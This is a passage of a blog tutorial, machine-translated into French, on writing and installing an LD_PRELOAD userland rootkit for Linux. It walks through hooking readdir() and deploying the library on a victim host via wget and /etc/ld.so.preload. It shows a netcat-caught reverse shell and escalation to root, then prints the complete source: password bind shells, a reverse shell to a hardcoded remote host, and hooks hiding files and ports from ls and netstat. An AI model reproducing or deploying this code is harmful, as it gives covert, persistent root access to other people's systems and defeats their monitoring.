Après avoir consulté quelques ressources, notamment cette explication de ls ici, je savais que je devais accrocher lareaddir() fonction qui est encore une fois un wrapper de niveau supérieur qui appellegetdents() . Nous pouvons le voir dans lastrace sortie :

tokyo:~/LearningC/ # strace /bin/ls                                                                                                     execve("/bin/ls", ["/bin/ls"], 0xbfbf4890 /* 47 vars */) = 0
-----snip-----
getdents64(3, /* 34 entries */, 32768)  = 1064
getdents64(3, /* 0 entries */, 32768)   = 0
close(3)  
Nous voyons que l'obtentiongetdents() des entrées de répertoire pour le3 descripteur de fichier ramène34 des entrées d'une taille de1064 . Nous devons donc comprendre commentreaddir() cela fonctionne.

La page de manuel définit la fonction :struct dirent *readdir(DIR *dirp); .

Il renvoie donc un pointeur vers la structure suivantedirent du répertoire. Voici la définitionglibc de ladirent structure :

struct dirent {
               ino_t          d_ino;       /* Inode number */
               off_t          d_off;       /* Not an offset; see below */
               unsigned short d_reclen;    /* Length of this record */
               unsigned char  d_type;      /* Type of file; not supported
                                              by all filesystem types */
               char           d_name[256]; /* Null-terminated filename */
           }
Le seul membre obligatoire dans la structure estd_name celui qui est le nom de fichier à terminaison nulle de l'entrée. Cela semble assez facile en fait. Nous pouvons en fait saisir ce fait, qui est obligatoire, et comparer sa valeurd_name pour les entrées à une chaîne, par exemplerootkit.txt et manipuler d'une manière ou d'une autre la fonction pour ignorer nos entrées. Faisons-le vraiment ! Voici notre crochet pourreaddir() :

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}
J'ai obtenu cette accroche simplement en suivant la procédure pas à pas sur ce blog : https://ketansingh.net/overview-on-linux-userland-rootkits/

Nous pouvons le parcourir pièce par pièce :

struct dirent *(*old_readdir)(DIR *dir); même chose que notre hook pourfopen() , nous déclarons une fonction qui sera plus tard initialisée pour pointer vers l'adresse du réelreaddir() ;
struct dirent *readdir(DIR *dirp) nous déclarons une fonction qui correspond parfaitement à la définition de la fonction légitimereaddir() ;
old_readdir = dlsym(RTLD_NEXT, "readdir"); nous initialisons la fonction que nous avons déclarée pour qu'elle pointe vers le réelreaddir() ;
while (dir = old_readdir(dirp)) nous disons, même s'il est vrai que le légitime continuereaddir() d'itérer à travers les entrées du répertoire et de renvoyer une valeur, faites quelque chose ;
if(strstr(dir->d_name,FILENAME) == 0) break; nous comparons, qui est une définitionFILENAME, aud_name membre de ladir structure renvoyée par notreold_readdir() et si une correspondance est trouvée (c'est-à-dire que a0 est renvoyé), nous sommes surbreaking cette entrée et la sautons ;
enfin, nousreturn dir devons compléter le but appelé de la fonction.
Avec cette configuration, nous pouvons masquer des fichiers arbitraires de/bin/ls .

En fait, j'utilise ce foutu rootkit
Utilisons réellement cette chose. Imaginons que nous sommes root sur notre machine victime et qu'il est temps d'installer la bibliothèque malveillante.

Définissons toutes les définitions spécifiques à l'hôte victime et compilons la bibliothèque. Donnons-lui un nom non descriptif, quelque chose qui se fondra à l’œil nu. (Et mettons “man” dans le nom du fichier car Manteau). Compilons notre fichier C avec : gcc manteau.c -fPIC -shared -D_GNU_SOURCE -o libc.man.so.6 -ldl
wgetPassons cela à la victime, dans notre cas une machine Ubuntu i386 exécutant SSH.
root@ubuntu:/home/manteau# wget http://192.168.1.218/libc.man.so.6
Déplaçons-le vers la bonne bibliothèque dans laquelle résident les autres bibliothèques partagées, sur notre victime qui se trouve dans /lib/i386-linux-gnu/
root@ubuntu:/home/manteau# mv libc.man.so.6 /lib/i386-linux-gnu/libc.man.so.6
Mettons maintenant une référence à notre bibliothèque partagée malveillante dans le/etc/ld.so.preload fichier.
root@ubuntu:/home/manteau# echo "/lib/i386-linux-gnu/libc.man.so.6" > /etc/ld.so.preload
Vérifions que cela a pris en utilisantldd quelque chose comme/bin/ls et voyons si notre bibliothèque malveillante est la première bibliothèque partagée chargée en mémoire.
root@ubuntu:/home/manteau# ldd /bin/ls
 linux-gate.so.1 =>  (0xb7f06000)
 /lib/i386-linux-gnu/libc.man.so.6 (0xb7efc000)
 libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7ec0000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d0a000)
 libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7d05000)
 libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7c90000)
 /lib/ld-linux.so.2 (0xb7f08000)
 libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7c73000)
Bien sûr que oui. Ça a marché. La nôtre est la deuxième entrée. Redémarrons syslog puis obtenons une connexion. Nous utiliserons le déclencheur pour le shell inversé en texte clair sur le port 443 de notre attaquant.
root@ubuntu:/home/manteau# systemctl restart ssh
Démarrez un écouteur et envoyez notre déclencheur.
tokyo:~/LearningC/ # nc -lvp 443 -4                                                                                                      Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:443
tokyo:~/LearningC/ # ssh reverseshell4@192.168.1.192               
reverseshell4@192.168.1.192's password: 
tokyo:~/LearningC/ # nc -lvp 443                                   
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.1.192.
Ncat: Connection from 192.168.1.192:65065.
Utilisons nos privilèges sudo que nous avons laissés nous-mêmes et progressons vers root très rapidement
id
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
sudo su
id
uid=0(root) gid=0(root) groups=0(root)
Vérifionsnetstat notre connexion malveillante sur la victime,
root@ubuntu:/home/manteau# netstat -ano | grep -v unix
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
udp        0      0 127.0.1.1:53            0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:631             0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:43212           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:33102           0.0.0.0:*                           off (0.00/0/0)
udp6       0      0 :::52795                :::*                                off (0.00/0/0)
udp6       0      0 :::5353                 :::*                                off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
Génial. Notre connexion sur le port local65065 n'est pas affichée. Essayons de chercher quel était le fichier que j'ai choisi de cacher. /etc/etc/ld.so.preload
root@ubuntu:/home/manteau# ls -lah /etc
-----snip-----
-rw-r--r--   1 root root    110 Feb 20  2019 kernel-img.conf
-rw-r--r--   1 root root   1.3K Mar 10  2016 kerneloops.conf
drwxr-xr-x   2 root root   4.0K Sep 22 06:46 ldap
-rw-r--r--   1 root root    88K Oct  1 18:40 ld.so.cache
-rw-r--r--   1 root root     34 Jan 27  2016 ld.so.conf
drwxr-xr-x   2 root root   4.0K Jun  1 12:18 ld.so.conf.d
-rw-r--r--   1 root root    267 Oct 22  2015 legal
-rw-r--r--   1 root root     27 Jan  7  2015 libao.conf
-rw-r--r--   1 root root    191 Jan 18  2016 libaudit.conf
-----snip-----
Enfin, il est caché/etc/ld.so.preload et c'est bien parce que je pense que sur la plupart des systèmes, il n'existerait pas.
Mises à niveau potentielles de la bibliothèque
Si vous avez aimé cet article et que vous souhaitez approfondir la bibliothèque, j'ai quelques idées sur ce qui peut être amélioré :

Débarrassez-vous du déclencheur etsyslog développez un déclencheur pour lesshd service lui-même, de cette façon nous pouvons accéder à la boîte en tant que root sans aucune chapelure privée
Codez unopenssl programme client/serveur de connexion arrière afin que nous puissions obtenir des communications cryptées
Supprimez le hook de numéro de port magique et implémentez plutôt une magieGID que vous pouvez définir comme root sur les processus que vous exécutez
Bonus supplémentaire : corrigez le linker dynamique afin qu'il ne fasse pas référence à/etc/ld.so.preload mais référence silencieusement un répertoire différent que vous avez masqué. Le linker dynamique doit toujours signaler qu'il vérifie/etc/ld.so.preload mais nous le saurons mieux :)
Conclusion
Avec un peu de créativité et de copier/coller, nous avons pu faire beaucoup de mauvaises choses avec un simple C. Une grande partie de la programmation système est réalisée en C. Si nous voulons devenir bons en exploitation binaire, en ingénierie inverse, en recherche sur les vulnérabilités, etc., nous allons devoir être à l'aise avec C.

En dehors de ma solution pour me cachernetstat, beaucoup de ces idées ont déjà été réalisées et je me suis fortement appuyé sur du matériel de référence. J'inclurai une section de ressources en bas.

Bibliothèque complète des malveillants
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
//bind-shell definitions
#define KEY_4 "notavaliduser4"
#define KEY_6 "notavaliduser6"
#define PASS "areallysecurepassword1234!@#$"
#define LOC_PORT 65065
//reverse-shell definitions
#define KEY_R_4 "reverseshell4"
#define KEY_R_6 "reverseshell6"
#define REM_HOST4 "192.168.1.217"
#define REM_HOST6 "::1"
#define REM_PORT 443
//filename to hide
#define FILENAME "ld.so.preload"
//hex represenation of port to hide for /proc/net/tcp reads
#define KEY_PORT "FE29"

int ipv6_bind (void)
{
    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(LOC_PORT);
    addr.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count = 0; count < 3; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}

int ipv4_bind (void)
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOC_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count = 0; count < 3; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}

int ipv6_rev (void)
{
    const char* host = REM_HOST6;

    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(REM_PORT);
    inet_pton(AF_INET6, host, &addr.sin6_addr);

    struct sockaddr_in6 client;
    client.sin6_family = AF_INET6;
    client.sin6_port = htons(LOC_PORT);
    client.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}

int ipv4_rev (void)
{
    const char* host = REM_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}

ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");


    char *bind4 = strstr(buf, KEY_4);
    char *bind6 = strstr(buf, KEY_6);
    char *rev4 = strstr(buf, KEY_R_4);
    char *rev6 = strstr(buf, KEY_R_6);

    if (bind4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }

    else if (bind6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_bind();
    }

    else if (rev4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else if (rev6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_rev();
    }

    else
    {
        result = new_write(fildes, buf, nbytes);
    }

    return result;
}

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}


struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp)
{
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *dir;

    while (dir = old_readdir64(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}

FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode)
{
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile64();
		fp = orig_fopen64(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}

	fp = orig_fopen64(pathname, mode);
	return fp;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	orig_fopen = dlsym(RTLD_NEXT, "fopen");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;

	}

	fp = orig_fopen(pathname, mode);
	return fp;
}
Références
Je m'excuse si j'ai laissé quelqu'un de côté, écrire ce truc était flou, j'avais tellement d'onglets ouverts qu'ils pouvaient à peine y mettre des favicons.

/bin/l'explication
guide lsof
allocation du port d'Ephermeral
Explication de Jynx
rootkits LD_PRELOAD de l'espace utilisateur
accrochage des fonctions de bibliothèque partagée
programmation de socket en C
@epi052 recommandation de programmation de socket
Code source Jynx2
Programmation de socket IPV6
programmation de socket iamrastating
détection et analyse des rootkits LD_PRELOAD
